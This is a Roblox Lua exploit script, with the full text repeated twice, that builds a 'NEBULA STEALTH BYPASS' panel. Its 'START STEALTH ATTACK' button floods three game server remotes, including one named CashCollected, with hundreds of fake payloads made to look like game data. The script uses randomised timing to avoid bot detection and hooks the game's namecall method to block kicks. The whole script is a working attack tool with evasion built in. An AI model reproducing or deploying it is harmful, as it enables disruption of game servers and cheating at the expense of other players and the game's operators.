local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")

local player = Players.LocalPlayer
local isActive = false
local pulseMode = false
local power = 100 -- Scăzut valoarea default pentru stabilitate
local pulseInterval = 5

-- ========== BYPASS: PAYLOAD CURAT (Legit Looking) ==========
local function GenerateStealthPayload()
    local p = {}
    for i = 1, 5 do
        -- Folosim numere mari dar finite și string-uri care par date de joc
        p[HttpService:GenerateGUID(false):sub(1,8)] = {
            ["Value"] = math.random(9999, 999999),
            ["Tag"] = "Update",
            ["Timestamp"] = os.time(),
            ["Pos"] = Vector3.new(math.random(), 0, math.random())
        }
    end
    return p
end

-- ========== REPARARE TARGETE ==========
local function GetTargets()
    return {
        ReplicatedStorage:FindFirstChild("Packages/Synchronizer/RequestData", true),
        ReplicatedStorage:FindFirstChild("RF/ValentinesShopService/SearchUser", true),
        ReplicatedStorage:FindFirstChild("RE/PlotService/CashCollected", true)
    }
end

-- ========== INTERFAȚĂ (Păstrată dar optimizată) ==========
local ScreenGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
local Main = Instance.new("Frame", ScreenGui)
Main.Size, Main.Position = UDim2.new(0, 340, 0, 560), UDim2.new(0.5, -170, 0.2, 0)
Main.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 15)

local Title = Instance.new("TextLabel", Main)
Title.Size, Title.Text = UDim2.new(1, 0, 0, 50), "NEBULA STEALTH BYPASS"
Title.TextColor3, Title.Font = Color3.fromRGB(0, 255, 150), Enum.Font.GothamBlack
Title.BackgroundTransparency, Title.TextSize = 1, 18

-- Logica de Dragging (Scurtată)
local dragging, dragStart, startPos
Main.InputBegan:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 then dragging = true dragStart = i.Position startPos = Main.Position end end)
UserInputService.InputChanged:Connect(function(i) if dragging and i.UserInputType == Enum.UserInputType.MouseMovement then local delta = i.Position - dragStart Main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y) end end)
UserInputService.InputEnded:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end end)

local function CreateSlider(name, pos, minVal, maxVal, default, callback)
    local Label = Instance.new("TextLabel", Main)
    Label.Size, Label.Position = UDim2.new(1, 0, 0, 25), pos
    Label.Text, Label.TextColor3, Label.BackgroundTransparency = name..": "..default, Color3.new(1,1,1), 1
    local Bar = Instance.new("Frame", Main)
    Bar.Size, Bar.Position = UDim2.new(0.8, 0, 0, 4), pos + UDim2.new(0.1, 0, 0, 25)
    Bar.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    local Knob = Instance.new("TextButton", Bar)
    Knob.Size, Knob.Position = UDim2.new(0, 16, 0, 16), UDim2.new((default-minVal)/(maxVal-minVal), -8, 0.5, -8)
    Knob.BackgroundColor3 = Color3.fromRGB(0, 255, 150)
    Knob.Text = ""
    Instance.new("UICorner", Knob)
    Knob.MouseButton1Down:Connect(function()
        local move; move = RunService.RenderStepped:Connect(function()
            local p = math.clamp((player:GetMouse().X - Bar.AbsolutePosition.X) / Bar.AbsoluteSize.X, 0, 1)
            Knob.Position = UDim2.new(p, -8, 0.5, -8)
            local val = math.floor(minVal + (p * (maxVal - minVal)))
            Label.Text = name .. ": " .. val
            callback(val)
        end)
        UserInputService.InputEnded:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 then move:Disconnect() end end)
    end)
end

CreateSlider("BYPASS PRESSURE", UDim2.new(0, 0, 0.15, 0), 1, 500, 100, function(v) power = v end)
CreateSlider("PULSE INTERVAL", UDim2.new(0, 0, 0.28, 0), 1, 30, 5, function(v) pulseInterval = v end)

local ActionBtn = Instance.new("TextButton", Main)
ActionBtn.Size, ActionBtn.Position = UDim2.new(0.8, 0, 0, 60), UDim2.new(0.1, 0, 0.6, 0)
ActionBtn.Text, ActionBtn.BackgroundColor3 = "START STEALTH ATTACK", Color3.fromRGB(0, 100, 255)
ActionBtn.TextColor3, ActionBtn.Font = Color3.new(1, 1, 1), Enum.Font.GothamBlack
Instance.new("UICorner", ActionBtn)

-- ========== BYPASS ENGINE (JITTER + RATE LIMIT CONTROL) ==========
ActionBtn.MouseButton1Click:Connect(function()
    if isActive then isActive = false ActionBtn.Text = "START STEALTH ATTACK" return end
    isActive = true
    ActionBtn.Text = "ATTACKING..."
    
    task.spawn(function()
        local targets = GetTargets()
        while isActive do
            for i = 1, power do
                if not isActive then break end
                local payload = GenerateStealthPayload()
                
                for _, r in pairs(targets) do
                    if r then
                        task.spawn(function() -- task.spawn e mai sigur decât defer pentru timing
                            if r:IsA("RemoteEvent") then 
                                r:FireServer(payload)
                            elseif r:IsA("RemoteFunction") then 
                                -- RemoteFunctions pot bloca clientul, punem timeout virtual
                                task.spawn(function() r:InvokeServer(payload) end) 
                            end
                        end)
                    end
                end
                
                -- BYPASS: Nu trimitem totul deodată, lăsăm serverul să respire
                if i % 10 == 0 then 
                    task.wait(0.01) -- Mică pauză la fiecare 10 pachete
                end
            end
            
            -- Jittering: Așteptare variabilă pentru a nu părea bot
            local waitTime = pulseMode and pulseInterval or (math.random(1, 5) / 10)
            task.wait(waitTime)
        end
    end)
end)

-- ========== BYPASS: ANTI-KICK LOCAL (HOOK) ==========
-- Previne kick-ul dacă e trimis de scripturile de pe client
local oldKick
oldKick = hookmetamethod(game, "__namecall", function(self, ...)
    local method = getnamecallmethod()
    if self == player and (method == "Kick" or method == "kick") then
        warn("Bypass: Am blocat o tentativă de kick local!")
        return nil
    end
    return oldKick(self, ...)
end)
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")

local player = Players.LocalPlayer
local isActive = false
local pulseMode = false
local power = 100 -- Scăzut valoarea default pentru stabilitate
local pulseInterval = 5

-- ========== BYPASS: PAYLOAD CURAT (Legit Looking) ==========
local function GenerateStealthPayload()
    local p = {}
    for i = 1, 5 do
        -- Folosim numere mari dar finite și string-uri care par date de joc
        p[HttpService:GenerateGUID(false):sub(1,8)] = {
            ["Value"] = math.random(9999, 999999),
            ["Tag"] = "Update",
            ["Timestamp"] = os.time(),
            ["Pos"] = Vector3.new(math.random(), 0, math.random())
        }
    end
    return p
end

-- ========== REPARARE TARGETE ==========
local function GetTargets()
    return {
        ReplicatedStorage:FindFirstChild("Packages/Synchronizer/RequestData", true),
        ReplicatedStorage:FindFirstChild("RF/ValentinesShopService/SearchUser", true),
        ReplicatedStorage:FindFirstChild("RE/PlotService/CashCollected", true)
    }
end

-- ========== INTERFAȚĂ (Păstrată dar optimizată) ==========
local ScreenGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
local Main = Instance.new("Frame", ScreenGui)
Main.Size, Main.Position = UDim2.new(0, 340, 0, 560), UDim2.new(0.5, -170, 0.2, 0)
Main.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 15)

local Title = Instance.new("TextLabel", Main)
Title.Size, Title.Text = UDim2.new(1, 0, 0, 50), "NEBULA STEALTH BYPASS"
Title.TextColor3, Title.Font = Color3.fromRGB(0, 255, 150), Enum.Font.GothamBlack
Title.BackgroundTransparency, Title.TextSize = 1, 18

-- Logica de Dragging (Scurtată)
local dragging, dragStart, startPos
Main.InputBegan:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 then dragging = true dragStart = i.Position startPos = Main.Position end end)
UserInputService.InputChanged:Connect(function(i) if dragging and i.UserInputType == Enum.UserInputType.MouseMovement then local delta = i.Position - dragStart Main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y) end end)
UserInputService.InputEnded:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end end)

local function CreateSlider(name, pos, minVal, maxVal, default, callback)
    local Label = Instance.new("TextLabel", Main)
    Label.Size, Label.Position = UDim2.new(1, 0, 0, 25), pos
    Label.Text, Label.TextColor3, Label.BackgroundTransparency = name..": "..default, Color3.new(1,1,1), 1
    local Bar = Instance.new("Frame", Main)
    Bar.Size, Bar.Position = UDim2.new(0.8, 0, 0, 4), pos + UDim2.new(0.1, 0, 0, 25)
    Bar.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    local Knob = Instance.new("TextButton", Bar)
    Knob.Size, Knob.Position = UDim2.new(0, 16, 0, 16), UDim2.new((default-minVal)/(maxVal-minVal), -8, 0.5, -8)
    Knob.BackgroundColor3 = Color3.fromRGB(0, 255, 150)
    Knob.Text = ""
    Instance.new("UICorner", Knob)
    Knob.MouseButton1Down:Connect(function()
        local move; move = RunService.RenderStepped:Connect(function()
            local p = math.clamp((player:GetMouse().X - Bar.AbsolutePosition.X) / Bar.AbsoluteSize.X, 0, 1)
            Knob.Position = UDim2.new(p, -8, 0.5, -8)
            local val = math.floor(minVal + (p * (maxVal - minVal)))
            Label.Text = name .. ": " .. val
            callback(val)
        end)
        UserInputService.InputEnded:Connect(function(i) if i.UserInputType == Enum.UserInputType.MouseButton1 then move:Disconnect() end end)
    end)
end

CreateSlider("BYPASS PRESSURE", UDim2.new(0, 0, 0.15, 0), 1, 500, 100, function(v) power = v end)
CreateSlider("PULSE INTERVAL", UDim2.new(0, 0, 0.28, 0), 1, 30, 5, function(v) pulseInterval = v end)

local ActionBtn = Instance.new("TextButton", Main)
ActionBtn.Size, ActionBtn.Position = UDim2.new(0.8, 0, 0, 60), UDim2.new(0.1, 0, 0.6, 0)
ActionBtn.Text, ActionBtn.BackgroundColor3 = "START STEALTH ATTACK", Color3.fromRGB(0, 100, 255)
ActionBtn.TextColor3, ActionBtn.Font = Color3.new(1, 1, 1), Enum.Font.GothamBlack
Instance.new("UICorner", ActionBtn)

-- ========== BYPASS ENGINE (JITTER + RATE LIMIT CONTROL) ==========
ActionBtn.MouseButton1Click:Connect(function()
    if isActive then isActive = false ActionBtn.Text = "START STEALTH ATTACK" return end
    isActive = true
    ActionBtn.Text = "ATTACKING..."
    
    task.spawn(function()
        local targets = GetTargets()
        while isActive do
            for i = 1, power do
                if not isActive then break end
                local payload = GenerateStealthPayload()
                
                for _, r in pairs(targets) do
                    if r then
                        task.spawn(function() -- task.spawn e mai sigur decât defer pentru timing
                            if r:IsA("RemoteEvent") then 
                                r:FireServer(payload)
                            elseif r:IsA("RemoteFunction") then 
                                -- RemoteFunctions pot bloca clientul, punem timeout virtual
                                task.spawn(function() r:InvokeServer(payload) end) 
                            end
                        end)
                    end
                end
                
                -- BYPASS: Nu trimitem totul deodată, lăsăm serverul să respire
                if i % 10 == 0 then 
                    task.wait(0.01) -- Mică pauză la fiecare 10 pachete
                end
            end
            
            -- Jittering: Așteptare variabilă pentru a nu părea bot
            local waitTime = pulseMode and pulseInterval or (math.random(1, 5) / 10)
            task.wait(waitTime)
        end
    end)
end)

-- ========== BYPASS: ANTI-KICK LOCAL (HOOK) ==========
-- Previne kick-ul dacă e trimis de scripturile de pe client
local oldKick
oldKick = hookmetamethod(game, "__namecall", function(self, ...)
    local method = getnamecallmethod()
    if self == player and (method == "Kick" or method == "kick") then
        warn("Bypass: Am blocat o tentativă de kick local!")
        return nil
    end
    return oldKick(self, ...)
end)
